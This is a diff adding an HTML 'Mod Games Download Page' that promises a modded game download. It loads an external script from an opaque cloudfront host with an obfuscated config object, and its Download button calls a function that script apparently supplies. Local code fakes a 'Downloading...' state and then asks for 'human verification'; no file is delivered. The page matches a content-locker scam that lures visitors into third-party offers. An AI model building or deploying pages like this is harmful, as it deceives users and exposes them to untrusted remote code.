@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script type="text/javascript">
+    var VwsPf_WTs_nOaXhc={"it":4300776,"key":"6acd6"};
+</script>
+<script src="https://d16w9e5gvnj8jg.cloudfront.net/9dd572c.js"></script>
+  <title>Mod Games Download Page</title>
+  <style>
+    /* CSS styles */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #1D222D;
+    }
+
+    header {
+      background-color: #13161D;
+      padding: 20px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 36px;
+      color: #13EFF7;
+      text-shadow: 4px 4px 4px rgba(13, 90, 233, 0.5);
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      max-width: 600px;
+      margin: 50px auto;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      opacity: 0;
+      transform: translateY(-50px);
+      transition: opacity 1s, transform 1s;
+    }
+
+    .container.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .download-button {
+      display: inline-block;
+      background-color: #38B6FF;
+      color: #fff;
+      padding: 12px 30px;
+      margin-top: 30px;
+      text-decoration: none;
+      border-radius: 5px;
+      font-size: 20px;
+      transition: background-color 0.3s ease;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .download-button:hover {
+      background-color: #0082cd;
+    }
+
+    footer {
+      background-color: #333;
+      color: #fff;
+      padding: 10px;
+      text-align: center;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+
+    footer p {
+      margin: 0;
+      font-size: 12px;
+    }
+
+    .container h2 {
+      font-size: 32px;
+      margin-bottom: 30px;
+      color: #13EFF7;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .container ol {
+      text-align: left;
+      font-size: 18px;
+      margin-left: 30px;
+      margin-bottom: 30px;
+    }
+
+    .container ol li {
+      margin-bottom: 15px;
+      position: relative;
+      padding-left: 20px;
+      color: #555;
+    }
+
+    .container ol li::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 8px;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background-color: #0a23ff;
+      box-shadow: 0 0 10px rgba(23, 58, 255, 0.5);
+    }
+
+    @media only screen and (max-width: 600px) {
+      .container {
+        padding: 20px;
+        margin: 20px 20px;
+      }
+
+      .container h2 {
+        font-size: 26px;
+      }
+
+      .container ol {
+        font-size: 16px;
+        margin-left: 0;
+        padding-left: 0;
+      }
+
+      .container ol li {
+        padding-left: 15px;
+        margin-left: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Mod Games Download Page</h1>
+  </header>
+
+  <main>
+    <div class="container">
+      <h2>Your mod Game is ready to download now!</h2>
+      <a href="#" class="download-button" onclick="_Jf()">Download Now</a>
+      <h3 style="font-size: 24px; margin-top: 40px;">How to Download Your Mod from Our Website:</h3>
+      <ol>
+        <li>Select your desired mod app or game</li>
+        <li>Complete the human verification process</li>
+        <li>Click the download button</li>
+        <li>After verification, your download will start automatically</li>
+      </ol>
+    </div>
+  </main>
+
+  <footer>
+    <p>&copy; 2023 - All rights reserved - Mod Game</p>
+  </footer>
+ <script>
+  // JavaScript code for the download button animation
+  const container = document.querySelector('.container');
+
+  window.addEventListener('load', () => {
+    container.classList.add('show');
+  });
+
+  const downloadButton = document.querySelector('.download-button');
+
+  downloadButton.addEventListener('click', () => {
+    downloadButton.innerHTML = 'Downloading...';
+    downloadButton.classList.add('downloading');
+
+    // Simulating a delay for the download process
+    setTimeout(() => {
+      downloadButton.innerHTML = 'please verify you are not a bot Fist';
+      downloadButton.classList.remove('downloading');
+    }, 3000);
+  });
+</script>
+
+</body>
+</html>
